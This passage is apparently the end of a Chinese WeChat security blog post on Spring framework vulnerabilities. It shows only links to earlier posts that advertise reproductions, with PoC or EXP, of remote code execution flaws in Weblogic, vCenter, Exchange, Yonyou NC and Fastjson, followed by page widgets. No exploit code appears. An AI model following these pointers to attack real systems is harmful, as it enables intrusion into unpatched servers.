python命令行的使用](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247488453&idx=1&sn=5828a0e1a2299d3ee0215f0ed4c30bf1&chksm=ea37ec9fdd406589124c67c45487be39ed1033d88c627092cf07f6d4f14ccdb9079b38dba74d&scene=21#wechat_redirect)  

[【超详细 | 附EXP】Weblogic CVE-2021-2394
RCE漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247488922&idx=1&sn=f43e3c243bbbfd2822867a3acaa8b85e&chksm=ea37eac0dd4063d63d98f935c73ce571cbfeb0e7272a6f171a28143bdb3e7134b09ea874969a&scene=21#wechat_redirect)

[【超详细】CVE-2020-14882 |
Weblogic未授权命令执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485550&idx=1&sn=921b100fd0a7cc183e92a5d3dd07185e&chksm=ea37f734dd407e22cfee57538d53a2d3f2ebb00014c8027d0b7b80591bcf30bc5647bfaf42f8&scene=21#wechat_redirect)

[【超详细 | 附PoC】CVE-2021-2109 | Weblogic
Server远程代码执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486517&idx=1&sn=34d494bd453a9472d2b2ebf42dc7e21b&chksm=ea37f36fdd407a7977b19d7fdd74acd44862517aac91dd51a28b8debe492d54f53b6bee07aa8&scene=21#wechat_redirect)

[【漏洞分析 | 附EXP】CVE-2021-21985 VMware vCenter Server
远程代码执行漏洞](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247487906&idx=1&sn=e35998115108336f8b7c6679e16d1d0a&chksm=ea37eef8dd4067ee13470391ded0f1c8e269f01bcdee4273e9f57ca8924797447f72eb2656b2&scene=21#wechat_redirect)

[【CNVD-2021-30167 | 附PoC】用友NC
BeanShell远程代码执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247487897&idx=1&sn=6ab1eb2c83f164ff65084f8ba015ad60&chksm=ea37eec3dd4067d56adcb89a27478f7dbbb83b5077af14e108eca0c82168ae53ce4d1fbffabf&scene=21#wechat_redirect)  

##
[【奇淫巧技】如何成为一个合格的“FOFA”工程师](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485135&idx=1&sn=f872054b31429e244a6e56385698404a&chksm=ea37f995dd40708367700fc53cca4ce8cb490bc1fe23dd1f167d86c0d2014a0c03005af99b89&scene=21#wechat_redirect)

[【超详细】Microsoft Exchange
远程代码执行漏洞复现【CVE-2020-17144】](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485992&idx=1&sn=18741504243d11833aae7791f1acda25&chksm=ea37f572dd407c64894777bdf77e07bdfbb3ada0639ff3a19e9717e70f96b300ab437a8ed254&scene=21#wechat_redirect)

[【超详细】Fastjson1.2.24反序列化漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=1&sn=1178e571dcb60adb67f00e3837da69a3&chksm=ea37f965dd4070732b9bbfa2fe51a5fe9030e116983a84cd10657aec7a310b01090512439079&scene=21#wechat_redirect)

[  记一次HW实战笔记 |
艰难的提权爬坑](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=2&sn=5368b636aed77ce455a1e095c63651e4&chksm=ea37f965dd407073edbf27256c022645fe2c0bf8b57b38a6000e5aeb75733e10815a4028eb03&scene=21#wechat_redirect)

 _
**走过路过的大佬们留个关注再走呗**_![](https://gitee.com/fuli009/images/raw/master/public/20210903083118.png)

 **往期文章有彩蛋哦**
**![](https://gitee.com/fuli009/images/raw/master/public/20210903083119.png)**  

![](https://gitee.com/fuli009/images/raw/master/public/20210903083120.png)

一如既往的学习，一如既往的整理，一如即往的分享。![](https://gitee.com/fuli009/images/raw/master/public/20210903083121.png)  

“ **如侵权请私聊公众号删文** ”

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读原文

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![示意图](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

【干货】Spring框架漏洞渗透总结

最多200字，当前共字

__

发送中

写下你的留言

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。 视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

